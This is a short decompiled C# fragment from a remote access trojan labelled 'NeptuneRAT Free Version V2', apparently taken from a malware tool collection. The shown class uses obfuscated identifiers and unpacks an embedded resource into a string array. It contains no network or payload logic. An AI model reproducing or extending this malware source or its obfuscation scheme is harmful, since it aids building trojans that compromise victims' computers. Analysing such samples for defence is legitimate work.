// Decompiled with JetBrains decompiler
// Type: ⚔️MasonRAT✌؉؈بـطڞـ؊؊؎؈ٻﯧﻼ؎ۚ؉
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using System;
using System.IO;
using System.Runtime.InteropServices;

#nullable disable
public class \u2694️MasonRAT\u270C\u0609\u0608بـطڞـ\u060A\u060A\u060E\u0608ٻﯧﻼ\u060Eۚ\u0609
{
  public static byte[] \u06DAدﻻڠــ\u060Fؤٺاــ\u060A\u060Cڅ\u060Fگ([In] Stream obj0)
  {
    using (MemoryStream destination = new MemoryStream())
    {
      obj0.CopyTo((Stream) destination);
      return destination.ToArray();
    }
  }

  public static void ڙ\u060Bڼـ\u060Eټةْـ\u060Aڕ\u060Aٽ̍()
  {
    \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ = new string[0];
    StreamReader streamReader = new StreamReader((Stream) new MemoryStream(\u2694️MasonRAT\u270C\u060D\u060Dﻻ\u060Aڣـۭۚ\u060A\u060Aٺۭۧ.ټ\u060F\u060Aۭٸ\u060Eـ\u060Dڣ\u0608ـٽ\u0609ب\u060D\u060Bى(\u2694️MasonRAT\u270C\u0609\u0608بـطڞـ\u060A\u060A\u060E\u0608ٻﯧﻼ\u060Eۚ\u0609.\u06DAدﻻڠــ\u060Fؤٺاــ\u060A\u060Cڅ\u060Fگ(typeof (\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ).Assembly.GetManifestResourceStream("ــٸــ̨ۜٸ؊؉ۏڦـحڙڙ؏؈،ۡـ")), 1)));
    string str;
    while ((str = streamReader.ReadLine()) != null)
    {
      Array.Resize<string>(ref \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ.Length + 1);
      \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ[\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ.Length - 1] = str;
    }
  }
}
